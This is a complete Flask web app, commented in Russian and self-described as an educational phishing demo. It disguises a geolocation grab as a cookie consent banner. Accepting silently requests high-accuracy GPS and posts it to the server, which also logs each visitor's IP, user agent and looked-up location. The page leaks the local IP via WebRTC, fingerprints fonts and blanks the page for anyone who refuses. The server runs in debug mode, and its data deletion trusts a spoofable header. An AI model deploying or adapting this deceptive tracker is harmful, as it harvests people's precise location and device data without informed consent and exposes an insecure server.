from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import re
import json
import os

app = Flask(__name__)

# Конфигурация
COOKIE_NAME = "data_consent"
LOG_FILE = "user_data.json"

def get_ip_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json()
    except:
        return {"country": "Неизвестно", "city": "Неизвестно", "org": "Неизвестно"}

def parse_user_agent(user_agent):
    # Улучшенное определение ОС
    os = browser = "Неизвестно"
    
    os_patterns = [
        ('Windows 11', r'Windows NT 10.0; Win64; x64'),
        ('Windows 10', r'Windows NT 10.0'),
        ('Linux', r'Linux'),
        ('Android', r'Android'),
        ('iOS', r'iPhone|iPad|iPod'),
        ('Mac OS X', r'Macintosh')
    ]
    
    for name, pattern in os_patterns:
        if re.search(pattern, user_agent):
            os = name
            break

    # Определение браузера
    browser_patterns = [
        ('Chrome', r'Chrome|CriOS'),
        ('Firefox', r'Firefox|FxiOS'),
        ('Safari', r'Safari'),
        ('Edge', r'Edg')
    ]
    
    for name, pattern in browser_patterns:
        if re.search(pattern, user_agent):
            browser = name
            break

    device = "Смартфон/Планшет" if ('Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent) else "Компьютер"

    return os, browser, device

def log_data(ip, data):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Техническая информация</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #111;
            color: #00FF88;
            margin: 0;
            padding: 0;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            padding: 20px;
            margin: 20px auto;
            max-width: 800px;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.6);
        }
        .info-block {
            margin: 15px 0;
            padding: 10px;
            border-bottom: 1px solid #333;
        }
        h1, h2 {
            color: #00FF88;
        }
        #cookieConsent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #222;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 1000;
        }
        .consent-btn {
            background: #00AA00;
            color: white;
            border: none;
            padding: 8px 16px;
            margin: 0 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        .consent-btn.deny {
            background: #AA0000;
        }
        #loadingModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 1001;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 24px;
        }
        #mainContent {
            display: none;
        }
        #map {
            height: 300px;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
        }
        .warning {
            color: #FF5555;
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,0,0,0.1);
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <!-- Основной контент -->
    <div id="mainContent" class="container">
        <h1>🔍 Полная информация об устройстве</h1>
        
        <div class="info-block">
            <h2>🌍 Сеть и местоположение</h2>
            <p><strong>IP:</strong> {{ ip }}</p>
            <p><strong>Страна:</strong> {{ country }}</p>
            <p><strong>Город:</strong> {{ city }}</p>
            <p><strong>Провайдер:</strong> {{ isp }}</p>
            <div id="gpsInfo" style="display: none;">
                <p><strong>Координаты:</strong> <span id="coordinates"></span></p>
                <p><strong>Точность:</strong> <span id="accuracy"></span></p>
                <div id="map"></div>
            </div>
        </div>

        <div class="info-block">
            <h2>💻 Системная информация</h2>
            <p><strong>ОС:</strong> {{ os }}</p>
            <p><strong>Браузер:</strong> {{ browser }}</p>
            <p><strong>Устройство:</strong> {{ device }}</p>
            <p><strong>Ядра CPU:</strong> <span id="cpuCores"></span></p>
            <p><strong>Разрешение экрана:</strong> <span id="screenRes"></span></p>
        </div>

        <div class="info-block">
            <h2>📊 Дополнительные данные</h2>
            <p><strong>Локальный IP:</strong> <span id="localIp"></span></p>
            <p><strong>Доступные шрифты:</strong> <span id="fonts"></span></p>
        </div>

        <div class="warning">
            <h2>⚠️ Внимание!</h2>
            <p>Вы стали жертвой учебной фишинговой атаки. Соглашаясь на "cookies", вы фактически разрешили доступ к вашей геолокации.</p>
            <button onclick="deleteMyData()" style="background: #FF5555; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Удалить мои данные</button>
        </div>
    </div>

    <!-- Cookie-баннер -->
    <div id="cookieConsent">
        <p>Этот сайт использует cookies для улучшения работы. Продолжая, вы соглашаетесь с их использованием.</p>
        <button class="consent-btn" onclick="acceptCookies()">Принять</button>
        <button class="consent-btn deny" onclick="rejectCookies()">Отклонить</button>
    </div>

    <!-- Модальное окно загрузки -->
    <div id="loadingModal">
        <div>Загрузка персонализированного контента...</div>
    </div>

    <script>
        // Проверяем согласие
        function checkConsent() {
            return document.cookie.includes("{{ COOKIE_NAME }}=true");
        }

        // Если согласие есть, загружаем данные
        if (checkConsent()) {
            document.getElementById('cookieConsent').style.display = 'none';
            loadUserData();
        }

        function acceptCookies() {
            // Устанавливаем куки
            document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('loadingModal').style.display = 'flex';
            
            // Запрашиваем геолокацию через 1.5 секунды (имитация загрузки)
            setTimeout(() => {
                getGeolocation();
            }, 1500);
        }

        function rejectCookies() {
            window.location.href = "about:blank";
        }

        function loadUserData() {
            // Показываем основной контент
            document.getElementById('mainContent').style.display = 'block';
            
            // Заполняем системную информацию
            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
            document.getElementById('screenRes').textContent = window.screen.width + "x" + window.screen.height;
            
            // Получаем локальный IP через WebRTC
            getLocalIP();
            
            // Получаем список шрифтов
            getFontList();
        }

        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        
                        // Отображаем данные
                        document.getElementById('coordinates').textContent = lat.toFixed(6) + ", " + lon.toFixed(6);
                        document.getElementById('accuracy').textContent = "±" + Math.round(acc) + " метров";
                        showMap(lat, lon);
                        document.getElementById('gpsInfo').style.display = 'block';
                        
                        // Отправляем на сервер
                        fetch('/log_gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                lat: lat,
                                lon: lon,
                                acc: acc
                            })
                        });
                        
                        // Скрываем загрузку и показываем контент
                        document.getElementById('loadingModal').style.display = 'none';
                        loadUserData();
                    },
                    error => {
                        // В случае ошибки все равно показываем контент
                        document.getElementById('loadingModal').style.display = 'none';
                        loadUserData();
                    },
                    {enableHighAccuracy: true}
                );
            } else {
                // Геолокация не поддерживается
                document.getElementById('loadingModal').style.display = 'none';
                loadUserData();
            }
        }

        function showMap(lat, lon) {
            const map = document.getElementById('map');
            map.innerHTML = `
                <iframe
                    width="100%"
                    height="100%"
                    frameborder="0"
                    scrolling="no"
                    marginheight="0"
                    marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}"
                ></iframe>`;
        }

        function getLocalIP() {
            const rtc = new RTCPeerConnection({iceServers: []});
            rtc.createDataChannel("");
            rtc.onicecandidate = e => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (ip) {
                        document.getElementById('localIp').textContent = ip[1];
                        rtc.close();
                    }
                }
            };
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        }

        function getFontList() {
            const fonts = ["Arial", "Times New Roman", "Courier New", "Verdana", "Georgia"];
            const available = [];
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            
            fonts.forEach(font => {
                ctx.font = `12px "${font}"`;
                if (ctx.measureText("test").width > 0) available.push(font);
            });
            
            document.getElementById('fonts').textContent = available.join(", ") || "Неизвестно";
        }

        function deleteMyData() {
            fetch('/delete_data', {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert("Ваши данные были удалены!");
                    } else {
                        alert("Ошибка при удалении данных");
                    }
                });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    consent = request.cookies.get(COOKIE_NAME)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Неизвестно')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    # Логируем базовую информацию
    log_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "user_agent": user_agent,
        "os": os,
        "browser": browser,
        "device": device,
        "geo": {
            "country": geo.get('country'),
            "city": geo.get('city'),
            "isp": geo.get('org')
        }
    })
    
    return render_template_string(HTML_TEMPLATE,
        ip=ip,
        country=geo.get('country', 'Неизвестно'),
        city=geo.get('city', 'Неизвестно'),
        isp=geo.get('org', 'Неизвестно'),
        os=os,
        browser=browser,
        device=device,
        COOKIE_NAME=COOKIE_NAME
    )

@app.route('/log_gps', methods=['POST'])
def log_gps():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "gps_data": data
    })
    
    return {'status': 'success'}

@app.route('/delete_data', methods=['POST'])
def delete_data():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = [json.loads(line) for line in f.readlines() if line.strip()]
            
            new_logs = [log for log in logs if log.get('ip') != ip]
            
            with open(LOG_FILE, "w") as f:
                for log in new_logs:
                    f.write(json.dumps(log) + "\n")
            
            return {'success': len(logs) != len(new_logs)}
    except Exception as e:
        print(f"Ошибка удаления данных: {e}")
    
    return {'success': False}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
